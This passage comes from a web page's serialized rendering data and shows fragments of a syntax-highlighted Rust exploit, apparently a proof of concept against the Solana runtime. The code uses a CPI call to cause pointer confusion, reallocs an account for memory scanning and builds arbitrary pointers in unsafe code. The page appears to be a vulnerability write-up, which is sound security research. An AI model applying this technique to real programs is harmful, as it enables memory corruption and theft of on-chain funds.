rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[41]}]\n1003:[\"$\",\"span\",\"code-segment-384\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n1004:[\"$\",\"span\",\"code-segment-385\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n1005:[\"$\",\"span\",\"code-segment-386\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1006:[\"$\",\"span\",\"line-number--42\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[42]}]\n1007:[\"$\",\"span\",\"line-number--43\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[43]}]\n1008:[\"$\",\"span\",\"code-segment-390\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n1009:[\"$\",\"span\",\"code-segment-391\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Invoke CPI call to trigger pointer confusion\"]}]\n100a:[\"$\",\"span\",\"code-segment-392\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n100b:[\"$\",\"span\",\"line-number--44\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\""])</script><script>self.__next_f.push([1,"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[44]}]\n100c:[\"$\",\"span\",\"code-segment-394\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n100d:[\"$\",\"span\",\"code-segment-395\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"invoke_signed\"]}]\n100e:[\"$\",\"span\",\"code-segment-396\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n100f:[\"$\",\"span\",\"code-segment-397\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1010:[\"$\",\"span\",\"line-number--45\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[45]}]\n1011:[\"$\",\"span\",\"code-segment-399\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n1012:[\"$\",\"span\",\"code-segment-400\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n1013:[\"$\",\"span\",\"code-segment-401\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Instruction\"]}]\n1014:[\"$\",\"span\",\"code-segment-402\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n1015:[\"$\",\"span\",\"code-segment-403\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new_with_bincode\"]}]\n1016:[\"$\",\"span\",\"code-segment-404\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n1017:[\"$\",\"span\",\"code-segment-405\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1018:[\"$\",\"span\",\"line-number--46\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[46]}]\n1019:[\"$\",\"span\",\"code-segment-407\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n101a:[\"$\",\"span\",\"code-segment-"])</script><script>self.__next_f.push([1,"408\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n101b:[\"$\",\"span\",\"code-segment-409\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"program_id\"]}]\n101c:[\"$\",\"span\",\"code-segment-410\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n101d:[\"$\",\"span\",\"code-segment-411\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n101e:[\"$\",\"span\",\"line-number--47\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[47]}]\n101f:[\"$\",\"span\",\"code-segment-413\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n1020:[\"$\",\"span\",\"code-segment-414\",{\"className\":\"token token\",\"style\":{\"color\":\"#7ec699\"},\"children\":[\"b\\\"\\\"\"]}]\n1021:[\"$\",\"span\",\"code-segment-415\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n1022:[\"$\",\"span\",\"code-segment-416\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1023:[\"$\",\"span\",\"line-number--48\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[48]}]\n1024:[\"$\",\"span\",\"code-segment-418\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n1025:[\"$\",\"span\",\"code-segment-419\",{\"className\":\"token token macro\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"vec!\"]}]\n1026:[\"$\",\"span\",\"code-segment-420\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\n1027:[\"$\",\"span\",\"code-segment-421\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountMeta\"]}]\n1028:[\"$\",\"span\",\"code-segment-422\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n1029:[\"$\",\"span\",\"code-segment-423\",{\"className\":\"token "])</script><script>self.__next_f.push([1,"token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new\"]}]\n102a:[\"$\",\"span\",\"code-segment-424\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n102b:[\"$\",\"span\",\"code-segment-425\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}]\n102c:[\"$\",\"span\",\"code-segment-426\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\n102d:[\"$\",\"span\",\"code-segment-427\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}]\n102e:[\"$\",\"span\",\"code-segment-428\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\n102f:[\"$\",\"span\",\"code-segment-429\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n1030:[\"$\",\"span\",\"code-segment-430\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"key\"]}]\n1031:[\"$\",\"span\",\"code-segment-431\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n1032:[\"$\",\"span\",\"code-segment-432\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}]\n1033:[\"$\",\"span\",\"code-segment-433\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n1034:[\"$\",\"span\",\"code-segment-434\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1035:[\"$\",\"span\",\"code-segment-435\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n1036:[\"$\",\"span\",\"code-segment-436\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1037:[\"$\",\"span\",\"code-segment-437\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}]\n1038:[\"$\",\"span\",\"code-segment-438\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1039:[\"$\",\"span\",\"code-segment-439\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\n103a:[\"$\",\"span\",\"code-segment-440\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n103b:[\"$\",\"span\",\"code-segment-441\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n103c:[\"$\",\"span\",\"line-number--49\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"di"])</script><script>self.__next_f.push([1,"splay\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[49]}]\n103d:[\"$\",\"span\",\"code-segment-443\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n103e:[\"$\",\"span\",\"code-segment-444\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n103f:[\"$\",\"span\",\"code-segment-445\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n1040:[\"$\",\"span\",\"code-segment-446\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1041:[\"$\",\"span\",\"line-number--50\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[50]}]\n1042:[\"$\",\"span\",\"code-segment-448\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n1043:[\"$\",\"span\",\"code-segment-449\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n1044:[\"$\",\"span\",\"code-segment-450\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\n1045:[\"$\",\"span\",\"code-segment-451\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}]\n1046:[\"$\",\"span\",\"code-segment-452\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\n1047:[\"$\",\"span\",\"code-segment-453\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}]\n1048:[\"$\",\"span\",\"code-segment-454\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\n1049:[\"$\",\"span\",\"code-segment-455\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n104a:[\"$\",\"span\",\"code-segment-456\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}]\n104b:[\"$\",\"span\",\"code-segment-457\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n104c:[\"$\",\"span\",\"code-segment-458\",{\"className\":\"token to"])</script><script>self.__next_f.push([1,"ken\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n104d:[\"$\",\"span\",\"code-segment-459\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\n104e:[\"$\",\"span\",\"code-segment-460\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n104f:[\"$\",\"span\",\"code-segment-461\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1050:[\"$\",\"span\",\"line-number--51\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[51]}]\n1051:[\"$\",\"span\",\"code-segment-463\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n1052:[\"$\",\"span\",\"code-segment-464\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n1053:[\"$\",\"span\",\"code-segment-465\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\n1054:[\"$\",\"span\",\"code-segment-466\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\n1055:[\"$\",\"span\",\"code-segment-467\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n1056:[\"$\",\"span\",\"code-segment-468\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1057:[\"$\",\"span\",\"line-number--52\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[52]}]\n1058:[\"$\",\"span\",\"code-segment-470\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n1059:[\"$\",\"span\",\"code-segment-471\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n105a:[\"$\",\"span\",\"code-segment-472\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}]\n105b:[\"$\",\"span\",\"code-segment-473\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n105c:[\"$\",\"s"])</script><script>self.__next_f.push([1,"pan\",\"code-segment-474\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n105d:[\"$\",\"span\",\"line-number--53\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[53]}]\n105e:[\"$\",\"span\",\"line-number--54\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[54]}]\n105f:[\"$\",\"span\",\"code-segment-478\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n1060:[\"$\",\"span\",\"code-segment-479\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Resize LEVERAGE back to a larger size for memory scanning\"]}]\n1061:[\"$\",\"span\",\"code-segment-480\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1062:[\"$\",\"span\",\"line-number--55\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[55]}]\n1063:[\"$\",\"span\",\"code-segment-482\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        accounts\"]}]\n1064:[\"$\",\"span\",\"code-segment-483\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\n1065:[\"$\",\"span\",\"code-segment-484\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}]\n1066:[\"$\",\"span\",\"code-segment-485\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\n1067:[\"$\",\"span\",\"code-segment-486\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n1068:[\"$\",\"span\",\"code-segment-487\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"realloc\"]}]\n1069:[\"$\",\"span\","])</script><script>self.__next_f.push([1,"\"code-segment-488\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n106a:[\"$\",\"span\",\"code-segment-489\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0xa00000\"]}]\n106b:[\"$\",\"span\",\"code-segment-490\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n106c:[\"$\",\"span\",\"code-segment-491\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n106d:[\"$\",\"span\",\"code-segment-492\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}]\n106e:[\"$\",\"span\",\"code-segment-493\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n106f:[\"$\",\"span\",\"code-segment-494\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}]\n1070:[\"$\",\"span\",\"code-segment-495\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n1071:[\"$\",\"span\",\"code-segment-496\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1072:[\"$\",\"span\",\"line-number--56\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[56]}]\n1073:[\"$\",\"span\",\"line-number--57\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[57]}]\n1074:[\"$\",\"span\",\"code-segment-500\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n1075:[\"$\",\"span\",\"code-segment-501\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}]\n1076:[\"$\",\"span\",\"code-segment-502\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1077:[\"$\",\"span\",\"code-segment-503\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n1078:[\"$\",\"span\",\"code-segment-504\",{\"className\":\"$undefined\",\"style"])</script><script>self.__next_f.push([1,"\":{},\"children\":[\"\\n\"]}]\n1079:[\"$\",\"span\",\"line-number--58\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[58]}]\n107a:[\"$\",\"span\",\"code-segment-506\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n107b:[\"$\",\"span\",\"code-segment-507\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Scan memory to locate MemoryRegion structure\"]}]\n107c:[\"$\",\"span\",\"code-segment-508\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n107d:[\"$\",\"span\",\"line-number--59\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[59]}]\n107e:[\"$\",\"span\",\"code-segment-510\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n107f:[\"$\",\"span\",\"code-segment-511\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n1080:[\"$\",\"span\",\"code-segment-512\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1081:[\"$\",\"span\",\"code-segment-513\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n1082:[\"$\",\"span\",\"code-segment-514\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data_ptr \"]}]\n1083:[\"$\",\"span\",\"code-segment-515\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n1084:[\"$\",\"span\",\"code-segment-516\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts\"]}]\n1085:[\"$\",\"span\",\"code-segment-517\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\n1086:[\"$\",\"span\",\"code-segment-518\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}]\n1087:[\"$\",\"span\",\"code-segment-519\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]"])</script><script>self.__next_f.push([1,"}]\n1088:[\"$\",\"span\",\"code-segment-520\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n1089:[\"$\",\"span\",\"code-segment-521\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}]\n108a:[\"$\",\"span\",\"code-segment-522\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n108b:[\"$\",\"span\",\"code-segment-523\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}]\n108c:[\"$\",\"span\",\"code-segment-524\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n108d:[\"$\",\"span\",\"code-segment-525\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n108e:[\"$\",\"span\",\"code-segment-526\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n108f:[\"$\",\"span\",\"code-segment-527\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"as_ptr\"]}]\n1090:[\"$\",\"span\",\"code-segment-528\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n1091:[\"$\",\"span\",\"code-segment-529\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1092:[\"$\",\"span\",\"code-segment-530\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1093:[\"$\",\"span\",\"code-segment-531\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n1094:[\"$\",\"span\",\"code-segment-532\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1095:[\"$\",\"span\",\"code-segment-533\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n1096:[\"$\",\"span\",\"code-segment-534\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1097:[\"$\",\"span\",\"code-segment-535\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}]\n1098:[\"$\",\"span\",\"code-segment-536\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1099:[\"$\",\"span\",\"code-segment-537\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x2840\"]}]\n109a:[\"$\",\"span\",\"code-segment-538\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n109b:[\"$\",\"span\",\"code-segment-539\",{\"classN"])</script><script>self.__next_f.push([1,"ame\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n109c:[\"$\",\"span\",\"line-number--60\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[60]}]\n109d:[\"$\",\"span\",\"code-segment-541\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n109e:[\"$\",\"span\",\"code-segment-542\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n109f:[\"$\",\"span\",\"code-segment-543\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" arb_ptr \"]}]\n10a0:[\"$\",\"span\",\"code-segment-544\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n10a1:[\"$\",\"span\",\"code-segment-545\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts\"]}]\n10a2:[\"$\",\"span\",\"code-segment-546\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\n10a3:[\"$\",\"span\",\"code-segment-547\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"pointer_idx\"]}]\n10a4:[\"$\",\"span\",\"code-segment-548\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\n10a5:[\"$\",\"span\",\"code-segment-549\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n10a6:[\"$\",\"span\",\"code-segment-550\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}]\n10a7:[\"$\",\"span\",\"code-segment-551\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n10a8:[\"$\",\"span\",\"code-segment-552\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}]\n10a9:[\"$\",\"span\",\"code-segment-553\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n10aa:[\"$\",\"span\",\"code-segment-554\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n10ab:[\"$\",\"span\",\"code-segment-555\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n10ac:[\"$\",\"span\",\"code-segment-556\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"ch"])</script><script>self.__next_f.push([1,"ildren\":[\"as_ptr\"]}]\n10ad:[\"$\",\"span\",\"code-segment-557\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n10ae:[\"$\",\"span\",\"code-segment-558\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n10af:[\"$\",\"span\",\"code-segment-559\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10b0:[\"$\",\"span\",\"code-segment-560\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n10b1:[\"$\",\"span\",\"code-segment-561\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n10b2:[\"$\",\"span\",\"code-segment-562\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n10b3:[\"$\",\"span\",\"code-segment-563\",{\"className\":\"token 